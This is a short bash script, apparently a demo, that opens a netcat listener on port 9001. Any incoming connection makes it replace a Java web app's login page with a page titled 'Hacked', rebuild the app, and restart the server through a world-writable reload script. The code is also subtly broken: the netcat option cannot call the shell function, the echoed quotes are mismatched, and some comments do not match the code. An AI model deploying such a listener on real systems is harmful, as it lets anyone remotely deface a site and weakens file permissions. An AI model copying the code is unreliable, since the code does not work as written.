#!/bin/bash

on_connection() {
    echo "Connection received!"
    cd src/main/java/main/java
    
    
    # Command to create an HTML file
    echo "<!DOCTYPE html>
<html lang=\"en\">
<head>
    <title>Hacked</title>
</head>
<body>
    <h2>Test</h2>
</body>
</html>" > login.html
    
    # Example command: list directory contents
    cd ../../../../..
    ./mvnw package
    echo "#!/bin/bash

PROCESS_ID=$(ps -ef | grep 'main.java.Server' | grep -v grep | awk '{print $2}')

if [ ! -z "$PROCESS_ID" ]; then
    kill $PROCESS_ID

    # Wait for the process to be killed
    wait $PROCESS_ID 2>/dev/null
    echo "Spark server stopped."
fi

./mvnw exec:java -Dexec.mainClass=main.java.Server" > reload.sh

    chmod 777 reload.sh
    ./reload.sh
}

# Start listening on the specified port. The -k option keeps nc listening after connections are closed
nc -lvnp 9001 -c on_connection